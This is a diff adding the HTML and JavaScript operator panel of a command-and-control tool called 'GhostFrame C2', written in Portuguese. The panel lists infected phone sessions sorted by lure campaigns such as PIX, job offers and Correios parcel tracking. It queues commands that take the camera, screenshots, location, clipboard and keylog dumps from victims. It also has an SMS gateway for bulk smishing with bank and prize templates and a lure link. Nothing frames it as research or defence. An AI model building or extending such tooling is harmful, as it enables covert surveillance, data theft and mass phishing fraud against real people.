@@ -1,0 +1,261 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>GhostFrame C2 — Painel</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{background:#0d1117;color:#c9d1d9;font-family:'Segoe UI',system-ui,sans-serif;font-size:14px;padding:16px}
+h1{font-size:18px;color:#f0f6fc;margin-bottom:4px}
+.sub{color:#8b949e;font-size:12px;margin-bottom:16px}
+.stats{display:flex;gap:12px;margin-bottom:16px;flex-wrap:wrap}
+.stat{background:#161b22;border:1px solid #30363d;border-radius:8px;padding:12px 20px;text-align:center;min-width:110px}
+.stat .num{font-size:22px;font-weight:700;color:#58a6ff}
+.stat .lbl{font-size:11px;color:#8b949e;text-transform:uppercase;letter-spacing:1px;margin-top:2px}
+.cards{display:flex;gap:14px;align-items:flex-start;flex-wrap:wrap}
+.card{background:#161b22;border:1px solid #30363d;border-radius:10px;padding:16px;min-width:320px;flex:1}
+.card h3{font-size:14px;color:#f0f6fc;margin-bottom:12px;border-bottom:1px solid #30363d;padding-bottom:8px}
+table{width:100%;border-collapse:collapse}
+th{font-size:11px;text-transform:uppercase;color:#8b949e;text-align:left;padding:6px 8px;border-bottom:1px solid #30363d}
+td{padding:6px 8px;border-bottom:1px solid #21262d;font-size:13px;vertical-align:top}
+.badge{display:inline-block;padding:2px 8px;border-radius:10px;font-size:11px;font-weight:600}
+.badge.on{background:#1f6feb22;color:#58a6ff;border:1px solid #1f6feb}
+.badge.off{background:#21262d;color:#8b949e;border:1px solid #30363d}
+.badge.camp{background:#23863622;color:#3fb950;border:1px solid #238636}
+.btn{border:none;border-radius:6px;padding:5px 10px;font-size:12px;font-weight:600;cursor:pointer;background:#21262d;color:#c9d1d9;border:1px solid #30363d;margin:1px}
+.btn:hover{border-color:#58a6ff;color:#58a6ff}
+.btn.primary{background:#238636;color:#fff;border-color:#238636}
+.btn.danger{background:#da3633;color:#fff;border-color:#da3633}
+.btn.sms{background:#8957e5;color:#fff;border-color:#8957e5}
+input,select,textarea{background:#0d1117;border:1px solid #30363d;border-radius:6px;color:#c9d1d9;padding:8px 10px;font-size:13px;width:100%;margin-bottom:8px}
+input:focus,select:focus,textarea:focus{border-color:#58a6ff;outline:none}
+label{display:block;font-size:11px;color:#8b949e;margin-bottom:3px;text-transform:uppercase;letter-spacing:0.5px}
+.row{display:flex;gap:8px}
+.row>*{flex:1}
+.result{background:#0d1117;border:1px solid #21262d;border-radius:6px;padding:6px 8px;margin-top:4px;font-size:11px;color:#8b949e;word-break:break-all;max-height:120px;overflow:auto}
+.result img{max-width:100%;max-height:200px;border-radius:6px;display:block;margin:4px 0}
+.result .cmd{color:#58a6ff;font-weight:600}
+.tabs{display:flex;gap:6px;margin-bottom:12px;flex-wrap:wrap}
+.tab{padding:6px 14px;border-radius:20px;font-size:12px;cursor:pointer;background:#21262d;color:#8b949e;border:1px solid #30363d}
+.tab.active{background:#1f6feb;color:#fff;border-color:#1f6feb}
+.sms-log{max-height:200px;overflow:auto;font-size:11px;font-family:monospace}
+.sms-log div{padding:4px 0;border-bottom:1px solid #21262d;color:#8b949e}
+.sms-log .ok{color:#3fb950}
+.sms-log .fail{color:#f85149}
+.toast{position:fixed;bottom:16px;right:16px;background:#238636;color:#fff;padding:10px 18px;border-radius:8px;font-size:13px;display:none;z-index:99;box-shadow:0 4px 12px rgba(0,0,0,.4)}
+.hidden{display:none}
+</style>
+</head>
+<body>
+
+<h1>🖥️ GhostFrame C2 — Painel v5</h1>
+<div class="sub">Polling REST 2s • Auto-recon • 5 campanhas • SMS Gateway</div>
+
+<div class="stats">
+  <div class="stat"><div class="num" id="stTotal">0</div><div class="lbl">Sessões</div></div>
+  <div class="stat"><div class="num" id="stOnline">0</div><div class="lbl">Online</div></div>
+  <div class="stat"><div class="num" id="stResults">0</div><div class="lbl">Resultados</div></div>
+  <div class="stat"><div class="num" id="stSms">0</div><div class="lbl">SMS Enviados</div></div>
+</div>
+
+<div class="tabs" id="campTabs">
+  <div class="tab active" data-camp="all">Todos</div>
+  <div class="tab" data-camp="pix">🏦 PIX</div>
+  <div class="tab" data-camp="emprego">💼 Emprego</div>
+  <div class="tab" data-camp="rastreio">📦 Correios</div>
+  <div class="tab" data-camp="roleta">🎰 Roleta</div>
+  <div class="tab" data-camp="quiz">🎯 Quiz</div>
+</div>
+
+<div class="cards">
+  <!-- SESSIONS -->
+  <div class="card" style="flex:2">
+    <h3>📡 Sessões / Beacons</h3>
+    <div style="overflow-x:auto">
+    <table id="sessTable">
+      <thead><tr><th>SID</th><th>Campanha</th><th>Status</th><th>UA</th><th>Último visto</th><th>Ações</th></tr></thead>
+      <tbody id="sessBody"></tbody>
+    </table>
+    </div>
+    <div id="detailArea" class="hidden" style="margin-top:14px">
+      <h3 id="detailTitle">Detalhes</h3>
+      <div id="detailBody"></div>
+    </div>
+  </div>
+
+  <!-- SMS -->
+  <div class="card" style="flex:1">
+    <h3>📱 SMS Gateway</h3>
+    <label>Número (DDD + 9 dígitos)</label>
+    <input id="smsNum" placeholder="11988887777">
+    <div class="row">
+      <div><label>Operadora</label>
+        <select id="smsOper"><option value="vivo">Vivo</option><option value="claro">Claro</option><option value="oi">Oi</option><option value="tim">TIM</option><option value="nextel">Nextel</option><option value="sercomtel">Sercomtel</option></select>
+      </div>
+      <div><label>Template</label>
+        <select id="smsTpl"><option value="wifi_test">Wi-Fi Test</option><option value="prize">Prêmio</option><option value="urgent">Alerta</option><option value="whatsapp_vip">WhatsApp VIP</option><option value="bank">Banco</option></select>
+      </div>
+    </div>
+    <label>Link</label>
+    <input id="smsLink" value="https://paul-devopsfera.github.io/programa-de-jogo-interessante">
+    <button class="btn primary" style="width:100%;padding:10px" onclick="sendSms()">📨 Enviar SMS</button>
+    <div style="margin-top:10px">
+      <label>Blast (um número por linha)</label>
+      <textarea id="smsBlastList" rows="3" placeholder="11988887777&#10;21977776666"></textarea>
+      <button class="btn sms" style="width:100%;padding:10px" onclick="sendBlast()">🚀 Enviar Blast</button>
+    </div>
+    <div style="margin-top:12px">
+      <label>Log de envios</label>
+      <div class="sms-log" id="smsLog"></div>
+    </div>
+  </div>
+</div>
+
+<div class="toast" id="toast"></div>
+
+<script>
+var currentCamp='all';
+var sessionCache={};
+
+function api(url, opts){
+  return fetch(url, opts).then(function(r){return r.json()}).catch(function(){return {}});
+}
+
+function shortUa(ua){
+  if(!ua)return '-';
+  var m=ua.match(/Android\s([\d.]+)/);
+  if(m)return 'Android '+m[1];
+  if(ua.indexOf('iPhone')>-1)return 'iOS';
+  if(ua.indexOf('Linux')>-1)return 'Linux';
+  if(ua.indexOf('Windows')>-1)return 'Windows';
+  return ua.slice(0,24);
+}
+
+function esc(s){
+  return String(s==null?'':s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;');
+}
+
+function renderResults(results){
+  if(!results||!results.length)return '<div class="sub">Sem resultados ainda</div>';
+  var html='';
+  results.slice().reverse().forEach(function(r){
+    var val=r.result||'';
+    var isImg=false;
+    try{var j=JSON.parse(val);if(j.image&&j.image.length>100){isImg=true;val='<img src="'+j.image+'">'+(j.error?'<br>'+esc(j.error):'')}}catch(e){}
+    html+='<div class="result"><span class="cmd">'+esc(r.command)+'</span> • '+esc(new Date(r.received_at*1000).toLocaleTimeString('pt-BR'))+'<br>'+(isImg?val:esc(val).slice(0,500))+'</div>';
+  });
+  return html;
+}
+
+function renderSessions(){
+  api('/api/sessions').then(function(d){
+    var tbody=document.getElementById('sessBody');
+    var html='';
+    var order=Object.keys(d).sort(function(a,b){return (d[b].last_seen||0)-(d[a].last_seen||0)});
+    order.forEach(function(sid){
+      var s=d[sid];
+      if(currentCamp!=='all'&&s.campaign!==currentCamp)return;
+      html+='<tr>'+
+        '<td style="font-family:monospace;font-size:11px">'+esc(sid.slice(0,8))+'</td>'+
+        '<td><span class="badge camp">'+esc(s.campaign)+'</span></td>'+
+        '<td><span class="badge '+(s.online?'on':'off')+'">'+(s.online?'● online':'○ off')+'</span></td>'+
+        '<td>'+esc(shortUa(s.ua))+'</td>'+
+        '<td>'+esc(s.age_seconds)+'s atrás</td>'+
+        '<td><button class="btn" onclick="showDetail(\''+sid+'\')">👁</button> '+
+        '<button class="btn" onclick="cmd(\''+sid+'\',\'info\')">info</button> '+
+        '<button class="btn" onclick="cmd(\''+sid+'\',\'camera_back\')">📷</button> '+
+        '<button class="btn" onclick="cmd(\''+sid+'\',\'screenshot\')">🖼</button> '+
+        '<button class="btn" onclick="cmd(\''+sid+'\',\'location\')">📍</button> '+
+        '<button class="btn" onclick="cmd(\''+sid+'\',\'clipboard\')">📋</button> '+
+        '<button class="btn" onclick="cmd(\''+sid+'\',\'keylog_dump\')">⌨</button>'+
+        '</td></tr>';
+      sessionCache[sid]=s;
+    });
+    tbody.innerHTML=html||'<tr><td colspan="6" class="sub">Nenhuma sessão. Abra um beacon no celular.</td></tr>';
+    document.getElementById('stTotal').textContent=Object.keys(d).length;
+    var online=0,results=0;
+    Object.keys(d).forEach(function(k){if(d[k].online)online++;results+=d[k].results_received});
+    document.getElementById('stOnline').textContent=online;
+    document.getElementById('stResults').textContent=results;
+  });
+}
+
+function showDetail(sid){
+  var s=sessionCache[sid];if(!s)return;
+  document.getElementById('detailArea').classList.remove('hidden');
+  document.getElementById('detailTitle').textContent='Detalhes — '+sid.slice(0,12);
+  var html='<div style="font-size:12px;color:#8b949e;margin-bottom:8px">';
+  html+='<b>UA:</b> '+esc(s.ua)+'<br>';
+  html+='<b>IP:</b> '+esc(s.ip)+' • <b>Campanha:</b> '+esc(s.campaign)+' • <b>Comandos:</b> '+s.commands_sent+' • <b>Resultados:</b> '+s.results_received+'<br>';
+  html+='<b>Path:</b> '+esc(s.path)+'<br><b>Referrer:</b> '+esc(s.referrer);
+  html+='</div>';
+  html+=renderResults(s.results);
+  document.getElementById('detailBody').innerHTML=html;
+}
+
+function cmd(sid,name){
+  api('/api/command',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({sid:sid,command:name})}).then(function(r){
+    toast('Comando '+name+' enfileirado');
+  });
+}
+
+function sendSms(){
+  var payload={
+    numero:document.getElementById('smsNum').value,
+    operadora:document.getElementById('smsOper').value,
+    template:document.getElementById('smsTpl').value,
+    link:document.getElementById('smsLink').value
+  };
+  if(!payload.numero||payload.numero.length<10){toast('Número inválido',true);return}
+  api('/api/sms/send',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(payload)}).then(function(r){
+    toast(r.ok?'SMS enviado para '+r.to:(r.error||'Falha'), !r.ok);
+    loadSmsLog();
+  });
+}
+
+function sendBlast(){
+  var nums=document.getElementById('smsBlastList').value.split('\n').map(function(s){return s.trim()}).filter(Boolean);
+  if(!nums.length){toast('Lista vazia',true);return}
+  api('/api/sms/blast',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({
+    numeros:nums,operadora:document.getElementById('smsOper').value,
+    template:document.getElementById('smsTpl').value,link:document.getElementById('smsLink').value
+  })}).then(function(r){toast(r.msg||'Blast iniciado');loadSmsLog()});
+}
+
+function loadSmsLog(){
+  api('/api/sms/log').then(function(log){
+    var el=document.getElementById('smsLog');
+    if(!Array.isArray(log)||!log.length){el.innerHTML='<div>Nenhum envio ainda</div>';return}
+    var html='';
+    log.slice().reverse().forEach(function(e){
+      html+='<div class="'+(e.ok?'ok':'fail')+'">'+esc(e.timestamp)+' • '+esc(e.numero)+' • '+esc(e.operadora)+' → '+(e.ok?'OK':'ERRO: '+esc(e.error||''))+'</div>';
+    });
+    el.innerHTML=html;
+    document.getElementById('stSms').textContent=log.length;
+  });
+}
+
+function toast(msg,isErr){
+  var t=document.getElementById('toast');
+  t.textContent=msg;
+  t.style.background=isErr?'#da3633':'#238636';
+  t.style.display='block';
+  setTimeout(function(){t.style.display='none'},2500);
+}
+
+document.getElementById('campTabs').addEventListener('click',function(e){
+  var t=e.target.closest('.tab');if(!t)return;
+  document.querySelectorAll('.tab').forEach(function(x){x.classList.remove('active')});
+  t.classList.add('active');
+  currentCamp=t.dataset.camp;
+  renderSessions();
+});
+
+renderSessions();
+loadSmsLog();
+setInterval(renderSessions,2000);
+setInterval(loadSmsLog,5000);
+</script>
+</body>
+</html>
